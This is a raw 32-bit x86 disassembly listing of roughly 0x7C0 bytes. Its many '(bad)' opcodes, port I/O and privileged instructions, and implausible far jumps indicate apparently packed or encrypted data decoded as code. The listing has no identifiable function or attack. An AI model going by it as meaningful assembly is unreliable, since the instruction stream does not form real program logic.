  417081:	lahf   
  417082:	test   eax,0xe46229b9
  417087:	loope  0x417032
  417089:	mov    bh,0xae
  41708b:	out    dx,al
  41708c:	fstp   TBYTE PTR [edx-0x7dc09e2]
  417092:	rol    DWORD PTR [ecx+0x64],1
  417095:	sbb    cl,BYTE PTR [ebp+0x3de24477]
  41709b:	mov    ecx,0xe5096074
  4170a0:	cmp    dl,BYTE PTR [ecx]
  4170a2:	jbe    0x41703b
  4170a4:	out    0xe2,al
  4170a6:	out    0xe8,al
  4170a8:	mov    ecx,0x85b27006
  4170ad:	call   0xbdc4490a
  4170b2:	loopne 0x41711e
  4170b4:	fdiv   st,st(4)
  4170b6:	nop
  4170b7:	div    BYTE PTR [ebp+edx*1+0x5b017f61]
  4170be:	xor    DWORD PTR [ecx-0x70],0xffffff96
  4170c2:	int3   
  4170c3:	ja     0x41705e
  4170c5:	adc    bl,BYTE PTR [edi]
  4170c7:	dec    edx
  4170c8:	adc    eax,0xd470f227
  4170cd:	adc    BYTE PTR [esi-0x2b],bl
  4170d0:	mov    esp,0x426aa14b
  4170d5:	je     0x4170ce
  4170d7:	aad    0x6a
  4170d9:	and    eax,0x61148c0a
  4170de:	in     eax,0xa
  4170e0:	push   0x17a10e7e
  4170e5:	push   es
  4170e6:	cmp    al,0x4e
  4170e8:	add    eax,0xd1440e3a
  4170ed:	int3   
  4170ee:	mov    esi,0xbcefd6ec
  4170f3:	(bad)  
  4170f4:	(bad)  
  4170f5:	popf   
  4170f6:	push   ebp
  4170f8:	jmp    0x417087
  4170fa:	ss inc eax
  4170fc:	sahf   
  4170fd:	sbb    eax,ecx
  4170ff:	stos   DWORD PTR es:[edi],eax
  417100:	loope  0x41717c
  417102:	mov    dh,0xb1
  417104:	imul   esi,DWORD PTR [ebx-0x1a],0xffffffe8
  417108:	pop    ebx
  417109:	mov    bl,0x8c
  41710b:	inc    esp
  41710c:	or     ebp,ebp
  41710e:	cmp    ebp,DWORD PTR [esi-0x7217015a]
  417114:	inc    eax
  417115:	add    DWORD PTR fs:[ecx-0x11de55c2],esi
  41711c:	outs   dx,DWORD PTR ds:[esi]
  41711d:	cli    
  41711e:	adc    ah,BYTE PTR [eax+0x34]
  417121:	int3   
  417122:	pusha  
  417123:	jp     0x41714e
  417125:	xchg   ebx,eax
  417126:	imul   esi,eax,0x30533416
  41712c:	add    dl,cl
  41712e:	retf   0x2e3b
  417131:	push   ebp
  417132:	cdq    
  417133:	mov    gs,WORD PTR [ebx-0x2]
  417136:	xchg   esi,eax
  417137:	cmp    al,0x46
  417139:	dec    ebp
  41713a:	scas   eax,DWORD PTR es:[edi]
  41713b:	sbb    DWORD PTR [eax],esi
  41713d:	iret   
  41713e:	cmc    
  41713f:	cmp    DWORD PTR [edi-0x5],0xf
  417143:	mov    dl,0x6a
  417145:	or     cl,ah
  417147:	pop    ss
  417148:	pop    esi
  417149:	jmp    FWORD PTR [ebx-0x1009fc90]
  41714f:	enter  0xf8fe,0x5b
  417153:	cwde   
  417154:	mov    eax,0xe8e4daca
  417159:	add    al,0x95
  41715b:	nop
  41715c:	adc    eax,0x627db768
  417161:	sub    al,0xbd
  417163:	or     DWORD PTR [eax+0x4d6dac59],ebp
  417169:	or     eax,0x7d2f73b0
  41716e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41716f:	fdiv   st(5),st
  417171:	(bad)  
  417173:	rcr    DWORD PTR [ecx+0x2ac1b59f],1
  417179:	mov    cl,0x2b
  41717b:	(bad)  
  41717d:	mov    ecx,cs
  41717f:	jecxz  0x4171b0
  417181:	retf   
  417182:	fbld   TBYTE PTR [ecx]
  417184:	out    0x33,eax
  417186:	sub    eax,0x4ad80cee
  41718b:	fst    DWORD PTR ss:[ecx+ecx*8-0x1b732a]
  417193:	js     0x417200
  417195:	icebp  
  417196:	adc    DWORD PTR [esi],edx
  417198:	outs   dx,DWORD PTR ds:[esi]
  417199:	repnz add al,0x62
  41719c:	xchg   edi,eax
  41719d:	sbb    al,0x7e
  41719f:	dec    ecx
  4171a0:	test   al,0x63
  4171a2:	push   ds
  4171a3:	rcl    BYTE PTR [ecx+edi*4],1
  4171a6:	leave  
  4171a7:	pop    ebp
  4171a8:	(bad)
  4171ab:	xor    BYTE PTR [edx-0x3893554d],ch
  4171b1:	aad    0x8c
  4171b3:	pop    es
  4171b4:	pop    ebx
  4171b5:	push   es
  4171b6:	add    esp,DWORD PTR [ebp+0x75faad13]
  4171bc:	loop   0x417217
  4171be:	inc    eax
  4171bf:	adc    BYTE PTR [eax+0x7e905d2f],bh
  4171c5:	lds    edi,FWORD PTR [esp+eax*1]
  4171c8:	adc    eax,0x713ca5fb
  4171cd:	mov    di,bx
  4171d0:	icebp  
  4171d1:	inc    edi
  4171d2:	xchg   DWORD PTR [ecx-0x50],ebx
  4171d5:	loope  0x4171d5
  4171d7:	push   es
  4171d8:	js     0x41718a
  4171da:	push   ds
  4171db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171dc:	jmp    0x220e7c47
  4171e1:	stc    
  4171e2:	jl     0x4171ed
  4171e4:	inc    edx
  4171e5:	loopne 0x4171af
  4171e7:	adc    eax,0x76d29952
  4171ec:	or     al,0x74
  4171ee:	in     eax,0xf3
  4171f0:	shl    BYTE PTR [edx-0x47031341],1
  4171f6:	in     eax,dx
  4171f7:	mov    bl,0xe6
  4171fa:	push   0x8f7e1221
  4171ff:	push   es
  417200:	push   esi
  417201:	sbb    edx,DWORD PTR [edi+0x5e4456c8]
  417207:	jmp    0xa9fb54bb
  41720c:	push   edi
  41720d:	repnz or eax,0x752a71ee
  417213:	jg     0x41722c
  417215:	jg     0x417215
  417217:	inc    ebp
  417218:	push   eax
  417219:	sub    DWORD PTR [edi+0x3b],esi
  41721c:	and    DWORD PTR [ebp-0x1e],ebx
  41721f:	dec    edi
  417220:	or     al,0x85
  417222:	inc    ebp
  417223:	push   ds
  417224:	rol    ecx,1
  417226:	inc    esp
  417227:	clts   
  417229:	fcmovnbe st,st(5)
  41722b:	ficom  DWORD PTR [edi-0x6]
  41722e:	jl     0x4171e8
  417230:	ret    
  417231:	mov    bl,0x72
  417233:	adc    eax,0xa7a535c6
  417238:	mov    ebx,DWORD PTR [esi]
  41723a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41723b:	mov    ebp,0x3434ad0
  417240:	sbb    al,0x1a
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	mov    al,ds:0x700af6c1
  417259:	es jg  0x4172cc
  41725c:	mov    ecx,0xf070707e
  417261:	push   ds
  417262:	mov    ebx,0x3ea1f9e6
  417267:	push   eax
  417268:	pop    ecx
  417269:	push   esp
  41726a:	call   0x8fe0:0xd36431cd
  417271:	dec    edi
  417272:	jp     0x4172b9
  417274:	icebp  
  417275:	inc    ebp
  417276:	out    dx,al
  417277:	in     eax,0x1
  417279:	aas    
  41727a:	xchg   edx,eax
  41727b:	fnstsw WORD PTR [eax-0x8933128]
  417281:	push   cs
  417282:	add    al,0xca
  417284:	dec    ebx
  417285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417286:	repz hlt 
  417288:	cmp    ebx,DWORD PTR [ebp-0x7467a02b]
  41728e:	lock (bad) 
  417290:	clc    
  417291:	lds    esi,FWORD PTR [edx+0x6065794c]
  417297:	jge    0x41728c
  417299:	icebp  
  41729a:	add    BYTE PTR [eax+0x53],bh
  41729d:	iret   
  41729e:	jge    0x417280
  4172a0:	mov    bl,0x61
  4172a2:	jmp    0xec4d:0xe451eb7c
  4172a9:	jo     0x417238
  4172ab:	xchg   esp,eax
  4172ac:	mov    edx,0x7712a85f
  4172b1:	stos   DWORD PTR es:[edi],eax
  4172b2:	xor    ebx,edi
  4172b4:	fptan  
  4172b6:	sahf   
  4172b7:	jns    0x417304
  4172b9:	clc    
  4172ba:	cmp    DWORD PTR [esi-0x37],esp
  4172bd:	pop    ss
  4172be:	or     eax,0xee8c7f3d
  4172c3:	xor    eax,0xb2bbb6cb
  4172c8:	out    0x67,eax
  4172ca:	push   edi
  4172cb:	xor    DWORD PTR [edi+0x2fc2877f],0xffffff86
  4172d2:	and    al,0x5e
  4172d4:	js     0x41725a
  4172d6:	scas   al,BYTE PTR es:[edi]
  4172d7:	sub    esi,DWORD PTR [eax]
  4172d9:	ja     0x4172b4
  4172db:	or     al,0xce
  4172dd:	jg     0x41729e
  4172df:	xchg   DWORD PTR [edi],esi
  4172e1:	es mov esi,0x79da2947
  4172e7:	push   esp
  4172e8:	pop    ebx
  4172e9:	loope  0x417338
  4172eb:	sbb    ecx,eax
  4172ed:	ja     0x41732b
  4172ef:	or     edi,ebx
  4172f1:	pushf  
  4172f2:	je     0x417320
  4172f4:	jl     0x417315
  4172f6:	and    eax,0x99de4bc
  4172fb:	adc    eax,0x24677992
  417300:	outs   dx,BYTE PTR ds:[esi]
  417301:	(bad)  
  417302:	addr16 mov bl,0x1e
  417305:	into   
  417306:	mov    gs:0x94b5e304,al
  41730c:	xchg   esi,eax
  41730d:	jnp    0x417343
  41730f:	call   0xfbd544c1
  417314:	jne    0x4172b0
  417316:	pusha  
  417317:	int    0x60
  417319:	lods   al,BYTE PTR ds:[esi]
  41731a:	imul   eax,ecx,0x9adea76b
  417320:	in     al,dx
  417321:	pop    edi
  417322:	xor    BYTE PTR [ebp+0x222ea0ec],dh
  417328:	push   esi
  417329:	mov    ah,0xdf
  41732b:	mov    dl,0xa5
  41732d:	dec    edi
  41732e:	cdq    
  41732f:	aad    0x42
  417331:	stos   DWORD PTR es:[edi],eax
  417332:	push   esp
  417333:	enter  0x2430,0x2b
  417337:	fs sbb dl,ch
  41733a:	sub    ecx,DWORD PTR [ebx+0x26c8c3e]
  417340:	and    al,0x22
  417342:	mov    edi,0xdb4b7229
  417347:	sbb    ecx,DWORD PTR [ebp-0x2f]
  41734a:	pop    edx
  41734b:	cld    
  41734c:	adc    eax,ebx
  41734e:	or     BYTE PTR [edx-0x35],dl
  417351:	ja     0x4173b2
  417353:	sub    eax,0x79ab7d95
  417358:	sar    BYTE PTR [edi+0x7b],1
  41735b:	cli    
  41735c:	call   FWORD PTR [edi-0x7]
  41735f:	jb     0x4173ab
  417361:	in     eax,0xe
  417363:	add    al,BYTE PTR [edi+0xb005c93]
  417369:	mov    bl,0x3d
  41736b:	push   ecx
  41736c:	xor    bh,al
  41736e:	cmp    DWORD PTR [eax],ebp
  417370:	sub    ecx,DWORD PTR [eax]
  417372:	inc    ebp
  417373:	add    bl,0x63
  417376:	xchg   ebp,eax
  417377:	popf   
  417378:	das    
  417379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41737a:	jno    0x417370
  41737c:	retf   0xf2bb
  41737f:	mov    dl,0xbe
  417381:	fsubr  DWORD PTR [ecx+0x54]
  417384:	sbb    ebx,DWORD PTR [esi]
  417386:	outs   dx,BYTE PTR ds:[esi]
  417387:	xchg   edx,eax
  417388:	xor    al,0x72
  41738a:	jno    0x41738e
  41738c:	dec    ecx
  41738d:	iret   
  41738e:	ret    
  41738f:	xlat   BYTE PTR ds:[ebx]
  417390:	leave  
  417391:	or     bh,ah
  417393:	push   ebp
  417394:	das    
  417395:	xchg   edx,eax
  417396:	scas   al,BYTE PTR es:[edi]
  417397:	scas   eax,DWORD PTR es:[edi]
  417398:	idiv   BYTE PTR [ecx+0x50002b27]
  41739e:	mov    eax,0x17ad743e
  4173a3:	push   ss
  4173a4:	lods   eax,DWORD PTR ds:[esi]
  4173a5:	mov    bh,0x29
  4173a7:	push   ebp
  4173a8:	jbe    0x4173c3
  4173aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173ab:	icebp  
  4173ac:	stos   BYTE PTR es:[edi],al
  4173ad:	mov    ch,0x4b
  4173af:	cdq    
  4173b0:	test   eax,0x43ea9c93
  4173b5:	push   esi
  4173b6:	or     eax,0xd97615e9
  4173bb:	mov    ds:0x21ee856c,al
  4173c0:	fstp   TBYTE PTR [edx-0xc]
  4173c3:	pop    es
  4173c4:	mov    esi,0xc53d8cd6
  4173c9:	inc    esp
  4173ca:	dec    edi
  4173cb:	repnz (bad) 
  4173cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173ce:	pop    ss
  4173cf:	pop    es
  4173d0:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173d2:	mov    edx,0xbbb4e1de
  4173d7:	xor    al,0x7a
  4173d9:	scas   eax,DWORD PTR es:[edi]
  4173da:	adc    edi,DWORD PTR [ebx+0x55]
  4173dd:	push   0x1c
  4173df:	add    ch,BYTE PTR [edx]
  4173e1:	imul   edi,DWORD PTR [edi+0x33],0x20
  4173e5:	fcmovbe st,st(2)
  4173e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173e8:	cmp    eax,0x3ae12650
  4173ed:	mov    bl,0x3f
  4173ef:	inc    ebp
  4173f0:	jmp    0x41742a
  4173f2:	adc    DWORD PTR [esi+ecx*1+0x49],ebx
  4173f6:	mov    BYTE PTR [ebx-0x3aeb97c3],0xd5
  4173fd:	iret   
  4173fe:	into   
  4173ff:	sub    eax,DWORD PTR [esi+0x19c01a36]
  417405:	gs xchg ebx,eax
  417407:	mov    esp,0x5eb6cbea
  41740c:	(bad)  
  41740d:	in     eax,0xf5
  41740f:	push   esp
  417410:	cmp    DWORD PTR [esi+0x7a],0xc84378bc
  417417:	mov    cl,0x2a
  417419:	mov    ch,0xb
  41741b:	add    BYTE PTR [eax-0x69],dl
  41741e:	fstp   QWORD PTR [ecx]
  417420:	call   0x704a:0xed4f24a5
  417427:	push   ebx
  417428:	push   esp
  417429:	adc    bl,BYTE PTR [ebp-0x80]
  41742c:	mov    ebx,ebp
  41742e:	adc    BYTE PTR [ebp+0x7d],0x6f
  417432:	jecxz  0x4173c1
  417434:	(bad)  
  417435:	call   0xdf1a:0x35ff4753
  41743c:	(bad)  
  41743d:	dec    esi
  41743e:	call   0x6b47:0x705c6278
  417445:	(bad)
  417449:	jbe    0x417486
  41744b:	repz dec edi
  41744d:	hlt    
  41744e:	enter  0x62d6,0xe0
  417452:	addr16 pop es
  417454:	inc    edi
  417455:	shr    DWORD PTR [eax-0x35778b41],0x40
  41745c:	inc    ebx
  41745d:	xor    DWORD PTR es:[edx],ebx
  417460:	xchg   edi,eax
  417461:	mov    al,0xfc
  417463:	imul   edi,DWORD PTR [esi],0xffffffa5
  417466:	je     0x41744f
  417468:	into   
  417469:	mov    DWORD PTR [esi+0x62],0x2ec63498
  417470:	push   ecx
  417471:	cdq    
  417472:	popf   
  417473:	pop    ds
  417474:	dec    esp
  417475:	dec    esi
  417476:	cmp    cl,BYTE PTR [esi+0x4b26ef54]
  41747c:	inc    eax
  41747d:	sbb    BYTE PTR [ebp-0x65],cl
  417480:	add    bl,0x6f
  417483:	pop    DWORD PTR [edx+0x3543a61d]
  417489:	ficom  DWORD PTR [ebx-0x62]
  41748c:	push   eax
  41748d:	mov    dl,0x73
  41748f:	dec    esp
  417490:	adc    cl,BYTE PTR [ebx+ecx*2-0x78]
  417494:	cld    
  417495:	inc    ebp
  417496:	stos   BYTE PTR es:[edi],al
  417497:	inc    esp
  417498:	push   cs
  417499:	mov    WORD PTR [eax+ecx*2+0x4d428f06],?
  4174a0:	adc    al,0x45
  4174a2:	add    al,0x1f
  4174a4:	jnp    0x417524
  4174a6:	std    
  4174a7:	or     al,BYTE PTR [ecx+0x21]
  4174aa:	jne    0x417527
  4174ac:	or     edi,DWORD PTR [edi-0x12]
  4174af:	sbb    DWORD PTR ds:0x7426f8fc,ecx
  4174b5:	(bad)  
  4174b6:	into   
  4174b7:	cs xchg edi,eax
  4174b9:	fnstsw WORD PTR ds:0x742c363
  4174bf:	push   ebp
  4174c0:	outs   dx,DWORD PTR ds:[esi]
  4174c1:	mov    al,0xcd
  4174c3:	mov    ds:0x5a4591f9,eax
  4174c8:	out    dx,eax
  4174c9:	push   0xffffffe2
  4174cb:	rol    DWORD PTR [esi+0x2a],0x4a
  4174cf:	cmp    eax,0x653d7810
  4174d4:	test   DWORD PTR [edx-0x6e701041],edi
  4174da:	sbb    ch,BYTE PTR [ebx]
  4174dc:	pop    ds
  4174dd:	push   0x6d922ac8
  4174e2:	sub    dl,dh
  4174e4:	or     ebx,edx
  4174e6:	sub    ecx,edx
  4174e8:	js     0x417489
  4174ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174eb:	dec    ecx
  4174ec:	hlt    
  4174ed:	loop   0x41753b
  4174ef:	xchg   BYTE PTR [ecx+0x3005de8b],dh
  4174f5:	mov    ch,0xb4
  4174f7:	fistp  WORD PTR [ebx]
  4174f9:	and    al,0x9c
  4174fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174fc:	or     ah,cl
  4174fe:	adc    DWORD PTR [edi],0x78
  417501:	sbb    dl,bh
  417503:	cmp    DWORD PTR [ecx+0x759fd843],esi
  417509:	bound  eax,QWORD PTR [eax+0x27]
  41750c:	adc    bh,dl
  41750e:	scas   eax,DWORD PTR es:[edi]
  41750f:	in     al,dx
  417510:	or     ebp,DWORD PTR [esi-0x1b]
  417513:	mov    bh,0xa0
  417515:	inc    ecx
  417516:	mov    WORD PTR [eax],fs
  417518:	fwait
  417519:	icebp  
  41751a:	or     al,0x77
  41751c:	push   ds
  41751d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41751e:	xchg   ecx,eax
  41751f:	inc    edi
  417520:	imul   BYTE PTR [ebp-0x17a57750]
  417526:	xor    BYTE PTR [ebx],0xd2
  417529:	add    DWORD PTR [ebp-0xc],ebx
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [edi],ecx
  417543:	fisttp WORD PTR ss:[esi-0x47]
  417547:	and    al,0x7f
  417549:	jo     0x417504
  41754b:	jle    0x4175bd
  41754d:	jo     0x41753d
  41754f:	shl    BYTE PTR [ebx+0x61b5b2cb],1
  417555:	xor    eax,0x5b822d25
  41755a:	jp     0x417551
  41755c:	in     al,dx
  41755d:	dec    edi
  41755e:	add    BYTE PTR [eax],bh
  417560:	iret   
  417561:	icebp  
  417562:	sbb    eax,0xf747074c
  417567:	mov    cs,edx
  417569:	mov    ds:0xc7a93593,eax
  41756e:	jp     0x4175a7
  417570:	cwde   
  417571:	(bad)  
  417572:	mov    eax,ds:0x8db56fb2
  417577:	(bad)  
  417578:	and    al,0xd8
  41757a:	xchg   esp,eax
  41757b:	pusha  
  41757c:	or     esp,DWORD PTR [esi]
  41757e:	jo     0x41754c
  417580:	fsub   QWORD PTR [ebx-0x7f]
  417583:	xor    DWORD PTR [ebp+0x38],edx
  417586:	mov    al,0x79
  417588:	mov    eax,0x60457de
  41758d:	es dec ebx
  41758f:	retf   0xd0f3
  417592:	pop    ss
  417593:	dec    edx
  417594:	pop    es
  417595:	adc    BYTE PTR ds:0x39a40aad,ah
  41759b:	ss hlt 
  41759d:	cmp    edi,DWORD PTR [eiz*1-0x196bbc4d]
  4175a4:	js     0x41761e
  4175a6:	in     eax,dx
  4175a7:	cdq    
  4175a8:	test   al,0x17
  4175aa:	ins    DWORD PTR es:[edi],dx
  4175ab:	and    DWORD PTR [ebp+0x4db88d0f],ebp
  4175b1:	mov    ds,WORD PTR [edi+eiz*8]
  4175b4:	enter  0xde79,0xf0
  4175b8:	or     edx,ebx
  4175ba:	inc    ecx
  4175bb:	mov    ebx,0x71b06c05
  4175c0:	(bad)  
  4175c1:	leave  
  4175c2:	icebp  
  4175c3:	cs daa 
  4175c5:	add    al,BYTE PTR [edx]
  4175c7:	xchg   ebp,eax
  4175c8:	es dec eax
  4175ca:	cli    
  4175cb:	fisubr WORD PTR [edi]
  4175cd:	cmp    BYTE PTR [esp+ebp*8-0x1],al
  4175d1:	into   
  4175d2:	jmp    0x41758f
  4175d4:	dec    eax
  4175d5:	lahf   
  4175d6:	mov    esi,DWORD PTR [ebp+0x5f785a0e]
  4175dc:	mov    ch,0xca
  4175de:	into   
  4175df:	in     al,0xae
  4175e1:	jne    0x4175d0
  4175e3:	sub    al,0x81
  4175e5:	sbb    eax,0x1770e245
  4175ea:	jne    0x4175d8
  4175ec:	pop    ebx
  4175ed:	test   dl,ch
  4175ef:	aaa    
  4175f0:	mov    al,ds:0x8f9a6b26
  4175f5:	sub    DWORD PTR [edx+0x4c],eax
  4175f8:	adc    al,0x88
  4175fa:	push   ebp
  4175fb:	outs   dx,DWORD PTR ds:[esi]
  4175fc:	cmp    ch,BYTE PTR [ebp+0x52e85dec]
  417602:	int3   
  417603:	mul    DWORD PTR gs:[ebx-0x388f143b]
  41760a:	es (bad) 
  41760c:	adc    BYTE PTR [edi],bl
  41760e:	jge    0x41760f
  417610:	add    eax,0xc8ff9d24
  417615:	sub    ebp,ebx
  417617:	jl     0x417658
  417619:	jnp    0x417623
  41761b:	or     bh,BYTE PTR [eax+eax*2]
  41761e:	dec    ebx
  41761f:	int3   
  417620:	jmp    0xaac2:0x857def2a
  417627:	pop    esi
  417628:	ins    DWORD PTR es:[edi],dx
  417629:	ja     0x417640
  41762b:	ret    
  41762c:	jge    0x41761d
  41762e:	lahf   
  41762f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417630:	jmp    0x417662
  417632:	inc    esp
  417633:	inc    edi
  417634:	in     eax,dx
  417635:	out    dx,al
  417636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417637:	push   cs
  417638:	dec    ebp
  417639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41763a:	mov    BYTE PTR [eax+0x27],ch
  41763d:	push   esi
  41763e:	pushf  
  41763f:	mov    WORD PTR [eax+0x45],es
  417642:	mov    edx,0x51e2bc4d
  417647:	lea    esp,[ebx-0x35]
  41764a:	outs   dx,DWORD PTR ds:[esi]
  41764b:	fcom   QWORD PTR [ebp+ebp*1+0x6db730d7]
  417652:	std    
  417653:	std    
  417654:	scas   eax,DWORD PTR es:[edi]
  417655:	arpl   bp,sp
  417657:	daa    
  417658:	xchg   BYTE PTR ds:0x5002efca,ah
  41765e:	inc    edx
  41765f:	jae    0x417663
  417661:	jbe    0x417610
  417663:	xor    BYTE PTR [esi-0x475f5320],ah
  417669:	jle    0x417614
  41766b:	test   dh,cl
  41766d:	mov    eax,ds:0x51aa65b0
  417672:	add    WORD PTR [edx+esi*1+0x4b],ax
  417677:	lock ss jmp 0x7640:0xdcb96e0d
  417680:	bnd jmp 0x417617
  417683:	lods   al,BYTE PTR ds:[esi]
  417684:	or     al,0xbf
  417686:	inc    esp
  417687:	scas   al,BYTE PTR es:[edi]
  417688:	or     dh,BYTE PTR [ecx]
  41768a:	or     ebx,esp
  41768c:	stos   DWORD PTR es:[edi],eax
  41768d:	pop    DWORD PTR [esi+ebx*4]
  417690:	call   0xf34b6e76
  417695:	jle    0x417670
  417697:	in     al,dx
  417698:	jmp    0xc7a2bdad
  41769d:	fcmovnbe st,st(5)
  41769f:	jbe    0x417625
  4176a1:	pop    ds
  4176a2:	imul   esi,DWORD PTR [edi],0xffffffa8
  4176a5:	jmp    0xc0bd:0x67f07365
  4176ac:	pop    eax
  4176ad:	jo     0x4176d9
  4176af:	(bad)  
  4176b0:	mov    al,ds:0xc6791302
  4176b5:	dec    ebp
  4176b6:	xchg   ecx,eax
  4176b7:	sub    al,0x8f
  4176b9:	fdivr  st,st(3)
  4176bb:	push   ebp
  4176bc:	mov    ds:0x47fea679,eax
  4176c1:	mov    cl,0x63
  4176c3:	lods   eax,DWORD PTR ds:[esi]
  4176c4:	pop    eax
  4176c5:	out    0xa9,al
  4176c7:	ret    0x3c4c
  4176ca:	mov    DWORD PTR [esi+0x3fa65373],ecx
  4176d0:	jo     0x41773d
  4176d2:	jl     0x4176ab
  4176d4:	test   eax,0x76a0a500
  4176d9:	cmp    eax,esi
  4176db:	mov    dl,0xc6
  4176dd:	mov    al,ds:0x963d962
  4176e2:	gs std 
  4176e4:	fimul  WORD PTR [edx-0x76]
  4176e7:	lock out 0x3f,ax
  4176eb:	or     eax,0x78349de3
  4176f0:	mov    BYTE PTR [ecx-0x4b],ah
  4176f3:	cmp    DWORD PTR [ebp-0x475be9a8],ecx
  4176f9:	dec    ebx
  4176fa:	lods   al,BYTE PTR ds:[esi]
  4176fb:	inc    ebx
  4176fc:	cmp    ebp,DWORD PTR [ebp+0x58c5883e]
  417702:	adc    edi,DWORD PTR [edx]
  417704:	arpl   WORD PTR [edx+eiz*4-0x4e],ax
  417708:	js     0x417764
  41770a:	mov    dh,0xc
  41770c:	pusha  
  41770d:	out    dx,eax
  41770e:	mov    ch,ch
  417710:	loope  0x41775b
  417712:	and    BYTE PTR [esi+0x1e],bh
  417715:	xor    al,BYTE PTR [esi-0x41]
  417718:	pop    ds
  417719:	inc    ebx
  41771a:	push   esp
  41771b:	push   edx
  41771c:	imul   esp,DWORD PTR [ebx+0xa],0x3b
  417720:	fwait
  417721:	adc    bl,bh
  417723:	aad    0xb7
  417725:	int    0x86
  417727:	pop    ecx
  417728:	sbb    al,0x42
  41772a:	test   al,0xd6
  41772c:	aad    0x3a
  41772e:	test   BYTE PTR [ecx+0x3b12f8ae],bl
  417734:	(bad)  
  417736:	pop    edi
  417737:	pop    ss
  417738:	jae    0x4177a7
  41773a:	push   esp
  41773b:	mov    ds:0x625bd646,al
  417740:	or     BYTE PTR [ebp+0x7e],bl
  417743:	or     edx,DWORD PTR [eax-0x7a332fb8]
  417749:	sbb    eax,0x20e9a285
  41774e:	cld    
  41774f:	or     BYTE PTR [ecx+0x34],cl
  417752:	mov    esp,0xad857b59
  417757:	sbb    al,0xeb
  417759:	neg    DWORD PTR [ebx+0x7b]
  41775c:	mul    BYTE PTR [ebp-0x7e]
  41775f:	iret   
  417760:	xchg   DWORD PTR [esi+0x450f9ea6],ebp
  417766:	push   ebx
  417767:	pop    ss
  417768:	pushf  
  417769:	imul   edx,eax,0x13f74c45
  41776f:	or     BYTE PTR [esi+0x7dd4efed],bl
  417775:	push   cs
  417776:	inc    ebx
  417777:	lods   eax,DWORD PTR ds:[esi]
  417778:	xchg   esp,eax
  417779:	pop    ebx
  41777a:	in     eax,0x89
  41777c:	into   
  41777d:	mov    ebp,0x76056288
  417782:	mov    eax,ds:0x7c8ed697
  417787:	jge    0x4177d0
  417789:	xchg   ebx,eax
  41778a:	leave  
  41778b:	repnz inc ebx
  41778d:	js     0x4177ea
  41778f:	aad    0x7f
  417791:	pop    ecx
  417792:	fdivr  QWORD PTR [esi-0x15]
  417795:	mov    ch,0x65
  417797:	xor    edx,DWORD PTR [eax+0x5c24031a]
  41779d:	mov    ebp,0x47c002d5
  4177a2:	ret    
  4177a3:	pop    ebp
  4177a4:	in     al,dx
  4177a5:	inc    edx
  4177a6:	cmp    bl,BYTE PTR gs:[ebx]
  4177a9:	mov    BYTE PTR [esi-0x8],ah
  4177ac:	mov    bh,0x69
  4177ae:	mov    edi,fs
  4177b0:	xchg   esp,eax
  4177b1:	sub    al,0x58
  4177b3:	(bad)  
  4177b4:	dec    ebx
  4177b5:	and    al,0xae
  4177b7:	xor    ebp,DWORD PTR [eax+0xe0845a0]
  4177bd:	or     DWORD PTR [ecx-0x3af361f5],edi
  4177c3:	int3   
  4177c4:	mov    cl,0x95
  4177c6:	iret   
  4177c7:	adc    BYTE PTR [edi+0x12],0x74
  4177cb:	fisubr WORD PTR [ebp+0x3c]
  4177ce:	jb     0x417798
  4177d0:	jbe    0x41775f
  4177d2:	xor    BYTE PTR [esi+0x7d],bh
  4177d5:	mov    WORD PTR [edi+0x31068660],ds
  4177db:	jle    0x417789
  4177dd:	mov    cs,WORD PTR ds:0xaa0fc68a
  4177e3:	in     eax,dx
  4177e4:	push   ecx
  4177e5:	pop    es
  4177e6:	push   ecx
  4177e7:	add    dl,dl
  4177e9:	push   ebp
  4177ea:	arpl   WORD PTR [eax-0x73ac9d7c],ax
  4177f0:	data16 mov cl,0x2d
  4177f3:	mov    dl,BYTE PTR [ecx-0x241c07b8]
  4177f9:	mov    edx,0x63435c04
  4177fe:	pusha  
  4177ff:	lahf   
  417800:	adc    cl,BYTE PTR [edi+eax*4]
  417803:	push   esi
  417804:	enter  0x47c6,0xea
  417808:	and    eax,0x9c37605a
  41780d:	push   ss
  41780e:	scas   al,BYTE PTR es:[edi]
  41780f:	outs   dx,DWORD PTR ds:[esi]
  417810:	out    0x34,al
  417812:	add    al,0xc3
  417814:	cs pop esi
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
